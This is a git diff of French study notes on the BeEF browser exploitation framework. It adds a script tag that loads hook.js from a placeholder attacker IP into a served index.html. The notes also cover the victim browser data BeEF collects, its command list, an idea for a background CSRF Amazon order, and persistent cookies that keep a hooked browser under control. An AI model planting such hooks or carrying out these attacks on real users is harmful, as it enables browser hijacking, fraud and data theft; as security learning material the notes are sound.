@@ -425,6 +425,7 @@ sudo beef-xss
 cd /var/www/html
 sudo vim index.html
 //je remplace dans la hook url par mon adresse ip publique dans mon index.html http://<your WAN IP address>:3000/hook.js
+// <script src="http://<IP>:3000/hook.js"></script>
 service apache2 restart
  //hook navigateur de francois
 `````
@@ -432,13 +433,44 @@ service apache2 restart
 [installer un serveur web à la maison](https://www.magentix.fr/blog/un-serveur-web-a-la-maison.html)
 J'ai fait avec le port forwarding, mais possibilité de faire avec Ngrok : [Tuto Ngrok de Grafikart](https://www.youtube.com/watch?v=PylWF44i2pY) Ngrok = outil qui permet de créer un tunnel vers votre environnement de développement en local. Ngrok va venir créer un tunnel. On ouvre ngrok, on dit ok je veux me connecter à toi. Là on ouvre un tunnel, comme un vpn, entre notre ordinateur et le serveur de ngrok, qui lui va nous créer un url sur le serveur de ngrok, que les utilisateurs vont pouvoir, eux, accéder directement au serveur qui est sur notre ordinateur. 
 
+## Informations
+
+|Details|A quoi ca correspond|
+|----|----|
+|browser.capabilities||
+|browser date||
+|browser.engine|= Moteur de rendu HTML (Chrome et Blink, Safari et webkit,...) |
+|browser.langage|FR, ...|
+|browser.name.reported|met tous les navigateurs et leurs versions|
+|browser.plugins|chrome PDF viewer (= le truc qui permet d'ouvrir des PDF avec les contours gris), ... Attention, que les plug-in, pas les extensions. Or, depuis 2021, les plug-ins sont obsolètes par la plupart des navigateurs, tandis que les extensions sont largement utilisées ==> elles les sont généralement que du code source, alors que les plug-ins sont toujours des fichiers exécutables|
+|browser.window.cookies||
+|window size height| taille en hauteur de la fenêtre|
+|window size width|taille en largeur de la fenêtre|
+|cpu cores||
+|screen height||
+|screen width||
+|host os family|OS X|
+
+Logs
+- si la fenêtre du navigateur a perdu le focus ou a retrouvé le focus
+- mouse click + position x;y
+- has executed instructions ....
 
 
-## Commandes & Malicious code
 
-Y a quoi dans le hook.js ?
+## Commandes Beef-xss & Malicious code
 
-// dans le commandes : rouge ca veut dire que la commande ne va pas fonctionner sur le browser de la victime, vert ca signifie que ca va marcher, et blanc ca veut dire que may work or not
+Quel est l'objectif ? Que veut-on faire sur l'ordinateur de la victime ?
+- Quelles commandes va-t-on appliquer ? 
+- On peut imaginer que en même temps que la personne est sur notre site malicieux, en background on ouvre amazon, et on commande un truc quon va s’envoyer à nous-même (XSRF) = à travers la connexion client serveur qui est déjà faite, on peut faire une requête qui est une transaction malveillante, l’utilisateur ne le voit pas visuellement car ca se passe en background ⇒ c’est une cross site request foregery ⇒ exploits server trust in user takes advantage of saved authentication
+
+Informations qu'on a :
+- les logs : là où clique, événements sur la page du côté de la victime
+- details : 
+
+#### A. Commandes Beef-xss
+
+--> historique du navigateur ?
 
 |commande|explication|
 |-----|------|
@@ -452,8 +484,22 @@ Y a quoi dans le hook.js ?
 |redirect browser|redirect the selected hooked browser to the adress specified in the 'redirected URL' input|
 |...||
 
+
+// dans le commandes : rouge ca veut dire que la commande ne va pas fonctionner sur le browser de la victime, vert ca signifie que ca va marcher, et blanc ca veut dire que may work or not
+
+- tester les commandes qu'il test ici : https://www.youtube.com/watch?v=ZYB4B89vAyw
+
+
+#### B. Malicious code
+
+- Y a quoi dans le hook.js ?
+hook.js, fichier qui, quand il est exécuté donne le hook à beef.
+
+
+
 ## Persistance
 
+Vous pouvez configurer BeEF pour créer des cookies persistants sur la machine victime qui survivront à une simple suppression du cache des cookies. Tant que la machine cible a une fenêtre de navigateur ouverte exécutant le code de crochet BeEF, l'attaquant aura accès au navigateur des victimes. C'est pendant cette fenêtre qu'un attaquant devrait lancer des exploits supplémentaires à partir du cadre BeEF pour maintenir une connexion persistante après la fermeture de la fenêtre du navigateur.
 
 
 
